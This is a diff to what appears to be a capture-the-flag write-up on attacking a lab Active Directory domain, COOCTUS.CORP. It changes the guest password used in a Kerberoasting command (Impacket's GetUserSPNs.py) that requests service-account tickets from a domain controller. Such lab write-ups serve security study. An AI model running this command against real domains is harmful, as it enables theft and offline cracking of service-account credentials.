@@ -205,7 +205,7 @@ I focused on the `reset` account:
 
 I requested a TGS ticket for the service account:
 ```bash
-GetUserSPNs.py 'COOCTUS.CORP/Visitor:Guest1234' -dc-ip 10.64.158.191 -request -outputfile out.txt
+GetUserSPNs.py 'COOCTUS.CORP/Visitor:GuestLogin!' -dc-ip 10.64.158.191 -request -outputfile out.txt
 ```
 
 Output:
